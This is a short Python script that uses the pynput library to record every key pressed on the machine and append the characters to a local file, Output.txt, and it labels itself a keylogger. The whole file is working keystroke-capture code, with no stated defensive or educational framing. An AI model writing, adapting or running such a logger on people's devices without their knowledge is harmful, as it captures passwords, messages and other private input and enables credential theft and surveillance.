from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("Output.txt", 'a') as LogKey:
        try:
            char = key.char
            LogKey.write(char)
        except:
                print("Error: Character Fetch Failure")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

print("Keylogger started...")